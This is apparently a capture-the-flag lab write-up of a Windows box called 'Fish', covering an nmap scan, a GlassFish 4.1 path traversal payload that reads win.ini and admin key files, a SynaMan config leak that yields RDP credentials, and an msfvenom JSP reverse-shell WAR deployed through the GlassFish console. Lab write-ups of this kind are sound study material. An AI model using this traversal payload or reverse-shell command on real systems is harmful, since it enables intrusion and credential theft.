---
icon: windows
---

# Fish - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn $ip -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 21:13 EDT
Nmap scan report for 192.168.165.168
Host is up (0.028s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-29T03:04:07
|_Not valid after:  2022-04-30T03:04:07
|_ssl-date: 2021-10-30T03:11:33+00:00; -3y306d22h06m11s from scanner time.
3700/tcp  open  giop
| fingerprint-strings:                                                                                                                        
|   GetRequest, X11Probe:                                                                                                                     
|     GIOP                                                                                                                                    
|   giop:                                                                                                                                     
|     GIOP                                                                                                                                    
|     (IDL:omg.org/SendingContext/CodeBase:1.0                                                                                                
|     169.254.197.188                                                                                                                         
|     169.254.197.188                                                                                                                         
|_    default                                                                                                                                 
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1                                                                   
|_http-server-header: GlassFish Server Open Source Edition  4.1                                                                               
|_http-title: Login                                                                                                                           
5040/tcp  open  unknown                                                                                                                       
6060/tcp  open  x11?                                                                                                                          
| fingerprint-strings:                                                                                                                        
|   GetRequest:                                                                                                                               
|     HTTP/1.1 200                                                                                                                            
|     Accept-Ranges: bytes                                                                                                                    
|     ETag: W/"425-1267803922000"                                                                                                             
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT                                                                                            
|     Content-Type: text/html                                                                                                                 
|     Content-Length: 425                                                                                                                     
|     Date: Sat, 30 Oct 2021 03:08:35 GMT                                                                                                     
|     Connection: close                                                                                                                       
|     Server: Synametrics Web Server v7                                                                                                       
|     <html>                                                                                                                                  
|     <head>                                                                                                                                  
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">                                                                                         
|     </head>                                                                                                                                 
|     <body>                                                                                                                                  
|     <script type="text/javascript">                                                                                                         
|     <!--                                                                                                                                    
|     currentLocation = window.location.pathname;                                                                                             
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){                                                                          
|     window.location = window.location + "app";                                                                                              
|     }else{                                                                                                                                  
|     window.location = window.location + "/app";                                                                                             
|     //-->                                                                                                                                   
|     </script>                                                                                                                               
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=82CE8DF448E39C7FA5B0FE329A20F54B; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Sat, 30 Oct 2021 03:08:36 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Sat, 30 Oct 2021 03:08:30 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didnt go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
7680/tcp  open  pando-pub?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-title: Data Web
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: Data Web
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.197.188:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
```

### <mark style="color:$primary;">HTTP Port 6060 TCP</mark>

<figure><img src="../../.gitbook/assets/image (418).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">HTTP Port 4848 TCP</mark>

<figure><img src="../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

Nmap found a version for us I am going to checkou searchsploit

<figure><img src="../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

Reveals a Path Traversal Exploit

```
searchsploit -m 39441
```

The txt file reveals multiple path traversal payloads we can try

```
http://192.168.165.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
```

<figure><img src="../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

Now we have a chance to read sensitive information on this box. Starting from the GoldFish administration console. Google search reveals there are a couple of target files

```
glassfish4/glassfish/domains/domain1/config/admin-keyfile
```

<figure><img src="../../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

```
glassfish4/glassfish/domains/domain1/config/local-password
```

<figure><img src="../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

I tried to cracking both files, but they seem uncrackable

One interesting thing I found is that I could read the proof.txt. This will be a great resource for PE.

<figure><img src="../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

Let’s move to another application and see if we can read the sensitive file. I will do the Synametrics File Manager. The target file here is _/synaman/config/AppConfig.xml_

We got creds here <mark style="color:$success;">**arthur:KingOfAtlantis**</mark>

```
xfreerdp3 /v:$ip /u:arthur /p:KingOfAtlantis /clipboard /dynamic-resolution /cert:ignore
```

<figure><img src="../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

The admin user on the GlassFish console has the ability to read **proof.txt**. We also know that GlassFish Server allows the deployment of **`.war`** files through its web-based admin console, which operates on port 4848. Let’s put together this information and get a system shell.

Accessing the console locally was easy, it didn’t even ask for credentials.

<figure><img src="../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

_Creating malicious_ **`.war`** _file_

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.243 LPORT=80 -f war > rev.war
```

<mark style="color:yellow;">**Transfer .war file → Application → Deploy → setup a listener on local machine and finally hit Launch**</mark>

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

Then click on the link on the next page

<figure><img src="../../.gitbook/assets/image (2517).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2518).png" alt=""><figcaption></figcaption></figure>
